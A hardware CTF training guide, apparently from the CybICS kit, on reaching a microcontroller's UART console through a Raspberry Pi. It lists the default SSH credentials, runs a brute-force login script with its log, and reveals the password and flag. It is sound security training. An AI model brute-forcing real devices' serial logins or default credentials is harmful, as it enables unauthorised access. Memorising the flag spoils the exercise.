# 🔌 UART Training Guide (Hardware Required)

## 📋 Overview
This guide covers how to connect to the CybICS micro controller using UART (Universal Asynchronous Receiver-Transmitter) communication.

## 🔗 Connecting to the System

### 🔐 SSH Connection
1. Connect to the Raspberry Pi:
   ```bash
   ssh pi@cybics
   ```
   - 🔑 Default password: `raspberry`
   - 🌐 If using a different hostname, replace 'cybics' with the correct IP address

### 📡 UART Communication
1. Install picocom if not already installed:
   ```bash
   sudo apt-get install picocom
   ```

2. Connect to the UART interface:
   ```bash
   picocom -b 115200 /dev/serial0
   ```

3. Common picocom commands:
   - `Ctrl+A Ctrl+X`: Exit picocom

## 🎯 Find the Flag
The flag has the format `CybICS(flag)`.

**💡 Hint**: The flag appears after successful login on the UART.

**🔑 Password Hint**: The password is 3 characters long and contains only out of lowercase letters.

<details>
  <summary><strong><span style="color:orange;font-weight: 900">🔍 Solution</span></strong></summary>
  
  Run the script:
  ```bash
  python3 bruteforce_login.py /dev/serial0 3 3
  ```

   The output should look like this:
  ```bash
   [*] Using password length range: 3-3
   2025-06-05 14:07:30 - INFO - Connected to /dev/serial0
   2025-06-05 14:07:30 - INFO - Results will be saved to bruteforce_results.txt
   2025-06-05 14:07:30 - INFO - Starting bruteforce attack...
   2025-06-05 14:07:30 - INFO - Total combinations to try: 17,576
   2025-06-05 14:07:30 - INFO - Trying 3 character combinations...
   [*] Current: cyb | Rate: 1.6 p/s | Attempts: 1,978 | Elapsed: 20.1m | Remaining: 2.6h2025-06-05 14:27:33 - INFO - 
   [+] Password found: cyb
   [+] Attempts: 1,978
   [+] Time taken: 20.1m
   [+] Average rate: 1.6 passwords/second
   2025-06-05 14:27:33 - INFO - Disconnected
  ```

  <div style="color:orange;font-weight: 900">
    🚩 Flag: CybICS(U#RT)
  </div>
</details>
